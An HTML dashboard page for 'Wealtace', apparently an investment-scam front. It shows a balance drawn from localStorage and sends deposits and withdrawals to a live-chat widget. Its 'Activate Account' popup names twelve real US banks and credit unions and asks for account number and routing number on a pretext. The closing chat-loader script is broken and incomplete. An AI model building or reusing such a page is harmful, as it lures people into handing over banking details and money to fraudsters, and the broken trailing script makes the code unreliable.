<!DOCTYPE html><html><head><title>Wealtace Dashboard</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>
:root{--blue:#002B7F;--red:#CE1126;--green:#28a745;--bg:#F0F4FF;}
*{margin:0;padding:0;font-family:'Segoe UI',Arial;box-sizing:border-box}
body{background:var(--bg)}
.header{background:var(--blue);color:#fff;padding:15px 20px;display:flex;justify-content:space-between;align-items:center;border-bottom:4px solid var(--red)}
.logout{color:#fff;text-decoration:none;font-weight:500;background:var(--red);padding:8px 15px;border-radius:6px}
.container{max-width:500px;margin:40px auto;padding:20px}
.user-box,.balance-box{background:#fff;padding:25px;border-radius:15px;text-align:center;box-shadow:0 5px 20px rgba(0,43,127,0.1);margin-bottom:25px;border-top:5px solid var(--red)}
.balance{font-size:38px;color:var(--green);font-weight:bold}
.btn{width:100%;padding:22px;margin:12px 0;border-radius:12px;border:none;font-size:18px;font-weight:bold;cursor:pointer;color:#fff}
.btn-deposit{background:var(--green)}.btn-withdraw{background:var(--red)}.btn-activate{background:var(--blue)}
.popup{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.6);justify-content:center;align-items:center;z-index:999}
.popup-box{background:#fff;padding:30px;border-radius:15px;max-width:450px;width:90%;border-top:5px solid var(--red)}
.popup-box h3{color:var(--blue);margin-bottom:15px;text-align:center}
.popup-box input,.popup-box select{width:100%;padding:14px;margin:8px 0;border:1px solid #ddd;border-radius:8px;font-size:16px}
</style>
</head><body>

<div class="header">
<h1>🇺🇸 WEALTACE DASHBOARD 🇨🇷</h1>
<a href="index.html" class="logout" onclick="localStorage.removeItem('wealtace_current_user')">Logout</a>
</div>

<div class="container">
<div class="user-box">
<h3 id="userName">Welcome</h3>
<p id="userEmail">email@example.com</p>
</div>

<div class="balance-box">
<h3>AVAILABLE BALANCE</h3>
<div class="balance" id="userBalance">$0.00</div>
</div>

<button class="btn btn-deposit" onclick="Tawk_API.toggle()">💰 Deposit</button>
<button class="btn btn-withdraw" onclick="Tawk_API.toggle()">🏦 Withdraw</button>
<button class="btn btn-activate" onclick="openActivate()">⚡ Activate Account</button>
</div>

<!-- ACTIVATE POPUP WITH 12 BANKS -->
<div class="popup" id="activatePopup">
<div class="popup-box">
<h3>Activate Account - Bank Details</h3>
<form onsubmit="submitActivate(event)">
<label><b>Select Bank / Credit Union</b></label>
<select id="bankType" required>
<option value="">-- Select --</option>

<optgroup label="BANKS">
<option>Huntington Bank</option>
<option>Chase Bank</option>
<option>Bank of America</option>
<option>Wells Fargo</option>
<option>Citibank</option>
<option>PNC Bank</option>
<option>Truist Bank</option>
</optgroup>

<optgroup label="CREDIT UNIONS">
<option>Abri Credit Union</option>
<option>GLCU Credit Union</option>
<option>Navy Federal Credit Union</option>
<option>State Employees Credit Union</option>
<option>First Tech Credit Union</option>
</optgroup>
</select>

<input type="text" id="accName" placeholder="Account Holder Name" required>
<input type="text" id="accNumber" placeholder="Account Number" required>
<input type="text" id="routingNumber" placeholder="Routing Number" required>

<button class="btn btn-activate">Submit for Activation</button>
<button type="button" class="btn" style="background:#999" onclick="closeActivate()">Cancel</button>
</form>
</div>
</div>

<script>
// Load user data
let currentUser = JSON.parse(localStorage.getItem('wealtace_current_user'));
if(!currentUser){ window.location.href = 'index.html'; }
let users = JSON.parse(localStorage.getItem('wealtace_users')) || [];
let user = users.find(u => u.email === currentUser.email);
document.getElementById('userName').innerText = 'Welcome, ' + user.name;
document.getElementById('userEmail').innerText = user.email;
document.getElementById('userBalance').innerText = '$' + (user.balance || 0).toFixed(2);

// POPUP FUNCTIONS
function openActivate(){ document.getElementById('activatePopup').style.display='flex'; }
function closeActivate(){ document.getElementById('activatePopup').style.display='none'; }

function submitActivate(e){
e.preventDefault();
let activations = JSON.parse(localStorage.getItem('wealtace_activations')) || [];
activations.push({
email:user.email,
bank:document.getElementById('bankType').value,
name:document.getElementById('accName').value,
acc:document.getElementById('accNumber').value,
routing:document.getElementById('routingNumber').value,
date:new Date().toLocaleString()
});
localStorage.setItem('wealtace_activations', JSON.stringify(activations));
alert('Activation Request Submitted! We will review it in 24hrs.');
closeActivate();
}
</script>

var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();

var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];

s1.charset='UTF-8';s1.setAttribute('crossorigin','*');s0.parentNode.insertBefore(s1,s0);
})();
</script>
</body></html>
